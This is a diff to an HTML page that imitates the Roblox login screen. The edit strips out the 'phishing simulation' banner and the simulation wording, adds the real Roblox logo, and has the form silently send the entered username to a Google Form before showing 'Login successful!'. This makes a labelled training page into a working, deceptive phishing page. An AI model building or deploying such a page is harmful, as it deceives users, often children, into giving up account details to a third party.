@@ -1,88 +1,82 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Roblox Login (Simulation)</title>
-  <style>
-    body {
-      font-family: 'Arial', sans-serif;
-      background-color: #e5e5e5;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-
-    .warning {
-      position: absolute;
-      top: 0;
-      width: 100%;
-      background: red;
-      color: white;
-      text-align: center;
-      padding: 10px;
-      font-weight: bold;
-    }
-
-    .login-box {
-      background: white;
-      padding: 30px;
-      border-radius: 8px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.2);
-      width: 300px;
-      text-align: center;
-    }
-
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 15px 0;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-    }
-
-    button {
-      background-color: #ff4747;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Roblox Login</title>
+<style>
+  /* Keep your existing styles, add any needed tweaks here */
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #f2f2f2;
+  }
+  .login-container {
+    width: 320px;
+    margin: 100px auto;
+    background: white;
+    padding: 30px;
+    border-radius: 8px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    text-align: center;
+  }
+  input[type="text"] {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0 20px 0;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+    font-size: 16px;
+  }
+  button {
+    background-color: #FF0000;
+    color: white;
+    padding: 12px;
+    border: none;
+    border-radius: 5px;
+    width: 100%;
+    font-weight: bold;
+    cursor: pointer;
+    font-size: 16px;
+  }
+  button:hover {
+    background-color: #cc0000;
+  }
+</style>
 </head>
 <body>
-  <div class="warning">
-    ⚠️ This is a phishing simulation for educational purposes only. Do NOT enter real credentials.
-  </div>
+<div class="login-container">
+  <img src="https://static.rbxcdn.com/images/Logo.svg" alt="Roblox Logo" style="width:120px; margin-bottom: 25px;" />
+  <form id="loginForm">
+    <input type="text" id="username" name="username" placeholder="Username" required />
+    <button type="submit">Log In</button>
+  </form>
+</div>
 
-  <div class="login-box">
-    <h2>Roblox Login</h2>
-    <form id="fakeLogin">
-      <input type="text" id="username" placeholder="Username" required />
-      <button type="submit">Log In</button>
-    </form>
-  </div>
+<script>
+  const form = document.getElementById('loginForm');
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    const username = document.getElementById('username').value.trim();
+    if (!username) {
+      alert('Please enter your username');
+      return;
+    }
+    // Google Form prefill URL with the username entered
+    const googleFormURL = 'https://docs.google.com/forms/d/e/1FAIpQLSfpRX-lOHy_k3LNBGDtg_yzSPGUWXvxQHdbp3JDXxPs259KCQ/formResponse?usp=pp_url&entry.579659565=' + encodeURIComponent(username);
 
-  <script>
-    document.getElementById("fakeLogin").addEventListener("submit", function(e) {
-      e.preventDefault();
-      const username = document.getElementById("username").value;
-
-      fetch("https://docs.google.com/forms/d/e/1FAIpQLSfpRX-lOHy_k3LNBGDtg_yzSPGUWXvxQHdbp3JDXxPs259KCQ/formResponse", {
-        method: "POST",
-        mode: "no-cors",
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded"
-        },
-        body: `entry.579659565=${encodeURIComponent(username)}`
-      });
-
-      alert("Username submitted. This is a simulation.");
+    // Send a POST request silently
+    fetch(googleFormURL, {
+      method: 'POST',
+      mode: 'no-cors'
+    }).then(() => {
+      // Redirect or show success message
+      alert('Login successful!');
+      // Redirect anywhere or just stay here
+      // window.location.href = 'https://www.roblox.com/';
+    }).catch(() => {
+      alert('There was an issue submitting your username.');
     });
-  </script>
+  });
+</script>
 </body>
 </html>
